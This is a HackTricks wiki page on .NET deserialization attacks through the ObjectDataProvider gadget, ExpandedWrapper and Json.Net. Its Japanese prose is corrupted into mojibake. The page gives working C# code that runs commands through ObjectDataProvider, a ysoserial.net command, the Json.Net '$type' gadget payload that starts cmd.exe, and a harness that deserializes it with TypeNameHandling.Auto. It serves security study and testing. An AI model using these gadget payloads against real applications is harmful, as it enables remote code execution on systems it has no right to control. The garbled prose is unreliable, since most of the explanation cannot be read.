# Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

ã“ã®æŠ•ç¨¿ã¯ã€**ObjectDataProvider ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒã©ã®ã‚ˆã†ã«æ‚ªç”¨ã•ã‚Œã‚‹ã‹ã‚’ç†è§£ã™ã‚‹ã“ã¨**ã¨ã€**Json.Net ã¨ xmlSerializer ã®ã‚·ãƒªã‚¢ãƒ«åŒ–ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒã©ã®ã‚ˆã†ã«ãã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã§æ‚ªç”¨ã•ã‚Œã‚‹ã‹**ã«æ§ã’ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚

## ObjectDataProvider ã‚¬ã‚¸ã‚§ãƒƒãƒˆ

ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‹ã‚‰: _ObjectDataProvider ã‚¯ãƒ©ã‚¹ã¯ã€ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã‚½ãƒ¼ã‚¹ã¨ã—ã¦ä½¿ç”¨ã§ãã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒ©ãƒƒãƒ—ã—ã¦ä½œæˆã—ã¾ã™ã€‚_\
ãã†ã§ã™ã­ã€å¥‡å¦™ãªèª¬æ˜ã§ã™ã®ã§ã€ã“ã®ã‚¯ãƒ©ã‚¹ãŒä½•ã‚’æŒã£ã¦ã„ã‚‹ã®ã‹è¦‹ã¦ã¿ã¾ã—ã‚‡ã†: ã“ã®ã‚¯ãƒ©ã‚¹ã¯ã€**ä»»æ„ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒ©ãƒƒãƒ—ã™ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã—ã€_**MethodParameters**_ ã‚’ä½¿ç”¨ã—ã¦ **ä»»æ„ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’è¨­å®šã—ã€**ãã®å¾Œ **MethodName ã‚’ä½¿ç”¨ã—ã¦ä»»æ„ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä»»æ„ã®é–¢æ•°ã‚’å‘¼ã³å‡ºã™**ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã—ãŸãŒã£ã¦ã€ä»»æ„ã® **ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã¯ **ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºä¸­ã«** **ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’æŒã¤** **é–¢æ•°ã‚’å®Ÿè¡Œ**ã—ã¾ã™ã€‚

### **ã“ã‚Œã¯ã©ã®ã‚ˆã†ã«å¯èƒ½ã‹**

**System.Windows.Data** åå‰ç©ºé–“ã¯ã€`C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF` ã® **PresentationFramework.dll** å†…ã§å®šç¾©ãŠã‚ˆã³å®Ÿè£…ã•ã‚Œã¦ã„ã¾ã™ã€‚

[**dnSpy**](https://github.com/0xd4d/dnSpy) ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€èˆˆå‘³ã®ã‚ã‚‹ã‚¯ãƒ©ã‚¹ã® **ã‚³ãƒ¼ãƒ‰ã‚’æ¤œæŸ»**ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ç”»åƒã§ã¯ã€**PresentationFramework.dll --> System.Windows.Data --> ObjectDataProvider --> ãƒ¡ã‚½ãƒƒãƒ‰å** ã®ã‚³ãƒ¼ãƒ‰ã‚’è¦‹ã¦ã„ã¾ã™ã€‚

![](<../../.gitbook/assets/image (427).png>)

`MethodName` ãŒè¨­å®šã•ã‚Œã‚‹ã¨ `base.Refresh()` ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã“ã‚ŒãŒä½•ã‚’ã™ã‚‹ã®ã‹è¦‹ã¦ã¿ã¾ã—ã‚‡ã†:

![](<../../.gitbook/assets/image (319).png>)

ã§ã¯ã€`this.BeginQuery()` ãŒä½•ã‚’ã™ã‚‹ã®ã‹ã‚’è¦‹ç¶šã‘ã¾ã—ã‚‡ã†ã€‚`BeginQuery` ã¯ `ObjectDataProvider` ã«ã‚ˆã£ã¦ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰ã•ã‚Œã¦ãŠã‚Šã€ã“ã‚ŒãŒãã®å‹•ä½œã§ã™:

![](<../../.gitbook/assets/image (345).png>)

ã‚³ãƒ¼ãƒ‰ã®æœ€å¾Œã§ `this.QueryWorke(null)` ã‚’å‘¼ã³å‡ºã—ã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚ŒãŒä½•ã‚’å®Ÿè¡Œã™ã‚‹ã®ã‹è¦‹ã¦ã¿ã¾ã—ã‚‡ã†:

![](<../../.gitbook/assets/image (596).png>)

ã“ã‚Œã¯ `QueryWorker` é–¢æ•°ã®å®Œå…¨ãªã‚³ãƒ¼ãƒ‰ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€èˆˆå‘³æ·±ã„éƒ¨åˆ†ã‚’ç¤ºã—ã¦ã„ã¾ã™: ã‚³ãƒ¼ãƒ‰ã¯ **`this.InvokeMethodOnInstance(out ex);` ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚** ã“ã‚Œã¯ **ãƒ¡ã‚½ãƒƒãƒ‰ã‚»ãƒƒãƒˆãŒå‘¼ã³å‡ºã•ã‚Œã‚‹**è¡Œã§ã™ã€‚

_**MethodName**_ ã‚’è¨­å®šã™ã‚‹ã ã‘ã§å®Ÿè¡Œã•ã‚Œã‚‹ã“ã¨ã‚’ç¢ºèªã—ãŸã„å ´åˆã¯ã€ã“ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™:
```java
using System.Windows.Data;
using System.Diagnostics;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ObjectDataProvider myODP = new ObjectDataProvider();
myODP.ObjectType = typeof(Process);
myODP.MethodParameters.Add("cmd.exe");
myODP.MethodParameters.Add("/c calc.exe");
myODP.MethodName = "Start";
}
}
}
```
æ³¨æ„ï¼š`System.Windows.Data`ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã«ã¯ã€_C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF\PresentationFramework.dll_ ã‚’å‚ç…§ã¨ã—ã¦è¿½åŠ ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

## ExpandedWrapper

å‰ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ãŒ_**ObjectDataProvider**_ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¨ã—ã¦**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹**ã‚±ãƒ¼ã‚¹ãŒã‚ã‚Šã¾ã™ï¼ˆä¾‹ãˆã°ã€DotNetNukeã®è„†å¼±æ€§ã§ã¯ã€XmlSerializerã‚’ä½¿ç”¨ã—ã¦ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯`GetType`ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã¾ã—ãŸï¼‰ã€‚ãã®ãŸã‚ã€_ObjectDataProvider_ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ãƒ©ãƒƒãƒ—ã•ã‚Œã¦ã„ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å‹ï¼ˆä¾‹ãˆã°`Process`ï¼‰ã«ã¤ã„ã¦**çŸ¥è­˜ãŒã‚ã‚Šã¾ã›ã‚“**ã€‚DotNetNukeã®è„†å¼±æ€§ã«ã¤ã„ã¦ã®è©³ç´°ã¯[ã“ã¡ã‚‰](https://translate.google.com/translate?hl=en\&sl=auto\&tl=en\&u=https%3A%2F%2Fpaper.seebug.org%2F365%2F\&sandbox=1)ã§ç¢ºèªã§ãã¾ã™ã€‚

ã“ã®ã‚¯ãƒ©ã‚¹ã¯ã€ç‰¹å®šã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚«ãƒ—ã‚»ãƒ«åŒ–ã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¿ã‚¤ãƒ—ã‚’**æŒ‡å®šã™ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®ã‚¯ãƒ©ã‚¹ã¯ã€ã‚½ãƒ¼ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆï¼ˆ_ObjectDataProvider_ï¼‰ã‚’æ–°ã—ã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¿ã‚¤ãƒ—ã«ã‚«ãƒ—ã‚»ãƒ«åŒ–ã—ã€å¿…è¦ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ï¼ˆ_ObjectDataProvider.MethodName_ãŠã‚ˆã³_ObjectDataProvider.MethodParameters_ï¼‰ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚\
ã“ã‚Œã¯ã€å‰è¿°ã®ã‚±ãƒ¼ã‚¹ã®ã‚ˆã†ãªå ´åˆã«éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚ãªãœãªã‚‰ã€**_ObjectDataProvider**_\*\*ã‚’\*\*_**ExpandedWrapper** \_ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å†…ã«**ãƒ©ãƒƒãƒ—**ã—ã€**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã•ã‚Œã‚‹ã¨**ã“ã®ã‚¯ãƒ©ã‚¹ã¯ã€_**MethodName**_ã§ç¤ºã•ã‚ŒãŸ**é–¢æ•°**ã‚’**å®Ÿè¡Œã™ã‚‹**_**OjectDataProvider**_ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**ä½œæˆ**ã—ã¾ã™ã€‚

æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã§ã“ã®ãƒ©ãƒƒãƒ‘ãƒ¼ã‚’ç¢ºèªã§ãã¾ã™ï¼š
```java
using System.Windows.Data;
using System.Diagnostics;
using System.Data.Services.Internal;

namespace ODPCustomSerialExample
{
class Program
{
static void Main(string[] args)
{
ExpandedWrapper<Process, ObjectDataProvider> myExpWrap = new ExpandedWrapper<Process, ObjectDataProvider>();
myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
myExpWrap.ProjectedProperty0.ObjectInstance = new Process();
myExpWrap.ProjectedProperty0.MethodParameters.Add("cmd.exe");
myExpWrap.ProjectedProperty0.MethodParameters.Add("/c calc.exe");
myExpWrap.ProjectedProperty0.MethodName = "Start";
}
}
}
```
## Json.Net

[å…¬å¼ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸](https://www.newtonsoft.com/json)ã«ã¯ã€ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒ**Json.NETã®å¼·åŠ›ãªJSONã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚¶ãƒ¼ã‚’ä½¿ç”¨ã—ã¦ã€ä»»æ„ã®.NETã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãŠã‚ˆã³ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹**ã¨è¨˜è¼‰ã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€**ObjectDataProviderã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã§ãã‚Œã°ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹ã ã‘ã§**RCE**ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

### Json.Netã®ä¾‹

ã¾ãšã€ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º/ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã™ã‚‹æ–¹æ³•ã®ä¾‹ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ï¼š
```java
using System;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Collections.Generic;

namespace DeserializationTests
{
public class Account
{
public string Email { get; set; }
public bool Active { get; set; }
public DateTime CreatedDate { get; set; }
public IList<string> Roles { get; set; }
}
class Program
{
static void Main(string[] args)
{
Account account = new Account
{
Email = "james@example.com",
Active = true,
CreatedDate = new DateTime(2013, 1, 20, 0, 0, 0, DateTimeKind.Utc),
Roles = new List<string>
{
"User",
"Admin"
}
};
//Serialize the object and print it
string json = JsonConvert.SerializeObject(account);
Console.WriteLine(json);
//{"Email":"james@example.com","Active":true,"CreatedDate":"2013-01-20T00:00:00Z","Roles":["User","Admin"]}

//Deserialize it
Account desaccount = JsonConvert.DeserializeObject<Account>(json);
Console.WriteLine(desaccount.Email);
}
}
}
```
### Json.Netã®æ‚ªç”¨

[ysoserial.net](https://github.com/pwntester/ysoserial.net)ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½œæˆã—ã¾ã—ãŸï¼š
```java
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
ã“ã®ã‚³ãƒ¼ãƒ‰ã§ã¯**ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ãƒ†ã‚¹ãƒˆ**ã§ãã¾ã™ã€‚å®Ÿè¡Œã™ã‚‹ã¨ã€è¨ˆç®—æ©ŸãŒèµ·å‹•ã™ã‚‹ã®ãŒã‚ã‹ã‚Šã¾ã™ã€‚
```java
using System;
using System.Text;
using Newtonsoft.Json;

namespace DeserializationTests
{
class Program
{
static void Main(string[] args)
{
//Declare exploit
string userdata = @"{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
'$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
'$values':['cmd', '/c calc.exe']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
//Exploit to base64
string userdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userdata));

//Get data from base64
byte[] userdata_nob64 = Convert.FromBase64String(userdata_b64);
//Deserialize data
string userdata_decoded = Encoding.UTF8.GetString(userdata_nob64);
object obj = JsonConvert.DeserializeObject<object>(userdata_decoded, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
}
}
}
```
{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
